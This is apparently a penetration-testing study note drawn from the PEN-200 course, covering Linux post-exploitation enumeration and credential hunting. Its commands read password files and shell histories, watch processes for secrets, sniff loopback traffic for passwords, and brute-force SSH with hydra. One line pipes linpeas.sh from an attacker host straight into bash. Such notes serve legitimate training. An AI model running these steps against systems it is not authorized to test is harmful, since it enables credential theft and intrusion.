# Manual Enumeration and Credential Hunting

> Based on PEN-200 Chapter 17. Use this after obtaining a Linux shell and before committing to a privilege-escalation exploit.

## 1. Identity, users, and host role

```bash
id
whoami
hostname
cat /etc/passwd
```

What to notice:
- `uid=0` is root.
- Regular users commonly have a home directory and an interactive shell such as `/bin/bash`.
- Service accounts often use shells such as `/usr/sbin/nologin` or `/bin/false`.
- Usernames and hostnames can reveal roles worth targeting.

## 2. OS, kernel, and architecture

```bash
cat /etc/issue
cat /etc/os-release
uname -a
arch 2>/dev/null
```

Record the **distribution**, **release**, **kernel version**, and **architecture**. Kernel exploits are highly version-dependent and a mismatch can crash or destabilize the target.

## 3. Privileged processes and service footprints

```bash
ps aux
ps auxww
watch -n 1 "ps -aux | grep pass"
```

Look for:
- Processes running as `root`.
- Custom services/daemons.
- Credentials exposed in command-line arguments.
- Root processes invoking scripts or user-controlled files.

Linux allows a low-privileged user to see information about many higher-privileged processes, so process command lines are worth checking repeatedly if a short-lived job may expose a secret.

## 4. User trails and clear-text secrets

```bash
env
cat ~/.bashrc 2>/dev/null
cat ~/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null
```

Do not grep only for `pass|key|secret|token`: Chapter 17's example used an environment variable named `SCRIPT_CREDENTIALS`, so inspect the full output or include broader terms such as `cred` and `auth`.

Interesting locations include:
- Environment variables
- `.bashrc` and other user-specific dotfiles
- Shell history
- Application dotfiles and configuration files

If you recover a plausible password, try **credential reuse** against other local users or services that you already know exist. Chapter 17 also demonstrates deriving a small targeted wordlist from a known password pattern and testing a known SSH user:

```bash
crunch 6 6 -t Lab%%% > wordlist
hydra -l <USER> -P wordlist <TARGET_IP> -t 4 ssh -V
```

Use targeted guesses only when the discovered credential gives you a justified pattern and the service/user is already known. After gaining another user's shell, run `sudo -l` again.

## 5. Interfaces, routes, and local-only services

```bash
ip a
routel 2>/dev/null || route -n
ss -anp
```

Look for:
- Multiple interfaces/networks → possible pivot path.
- Services listening only on `127.0.0.1` / `::1` → local attack surface hidden from external scans.
- Unexpected listening ports or active sessions.

If an extra interface/route exposes a subnet that Kali cannot reach, move to [[Active Directory/Pivoting-tunneling/Intro|Pivoting and Tunneling]]. Start with Ligolo-ng when practical, then use SSH/Socat/sshuttle/Chisel as fallbacks based on the traffic direction and available software.

## 6. Firewall artifacts

Root is normally required to list active `iptables` rules, but saved firewall configurations may be readable:

```bash
cat /etc/iptables/rules.v4 2>/dev/null
find /etc -type f -readable 2>/dev/null | grep -i iptables
```

A non-default allowed port can reveal a service worth investigating locally.

## 7. Cron discovery

```bash
ls -lah /etc/cron*
cat /etc/crontab
crontab -l
sudo crontab -l 2>/dev/null

grep "CRON" /var/log/syslog 2>/dev/null
```

For every discovered job ask:
1. Which user executes it?
2. What script/binary does it call?
3. Can I write to the file **or a directory/path component it depends on**?
4. How often does it execute?

A root cron job that runs a writable script is a direct escalation path.

## 8. Installed software

Debian-based systems:

```bash
dpkg -l
```

Red Hat-based systems use the `rpm` package manager. Record interesting application versions and correlate them with possible local vulnerabilities.

## 9. Writable directories and files

```bash
find / -writable -type d 2>/dev/null
```

Do not treat every writable result as exploitable. Prioritize anything that is:
- executed by root,
- used by a privileged service,
- referenced by cron,
- part of a privileged executable's path/configuration.

## 10. Mounted and unmounted storage

```bash
cat /etc/fstab
mount
lsblk
```

Why it matters:
- `/etc/fstab` shows filesystems intended to mount at boot.
- `mount` shows what is actually mounted now.
- `lsblk` may reveal additional partitions that are currently unmounted.

Unmounted or unusual storage can contain backups, documents, credentials, or configuration data.

## 11. Kernel modules / drivers

```bash
lsmod
/sbin/modinfo <MODULE>
```

Collect module names and versions when a vulnerable driver/module may provide a local escalation route.

## 12. Automated enumeration after the baseline

Primary:

```bash
curl http://<LHOST>/linpeas.sh | bash 2>/dev/null | tee /tmp/lp.out
```

PEN-200 also demonstrates:

```bash
./unix-privesc-check standard > output.txt
```

Other tools mentioned in Chapter 17 include **LinEnum** and **LinPEAS**. Automated output is a lead generator, not a replacement for manual review.

## 13. Service traffic / packet capture when permitted

If your user has permission to run `tcpdump`, loopback traffic may expose clear-text service credentials:

```bash
sudo tcpdump -i lo -A | grep "pass"
```

`tcpdump` normally requires elevated privileges because it uses raw sockets; only try this when `sudo -l` or capabilities permit it.

## 14. If a valid-looking abuse path fails

Check logs for security controls:

```bash
cat /var/log/syslog | grep -iE 'apparmor|denied|audit|tcpdump'
```

Chapter 17 demonstrates a GTFOBins-style `tcpdump` sudo technique being blocked by **AppArmor**. A failed technique can still teach you which control is preventing execution.
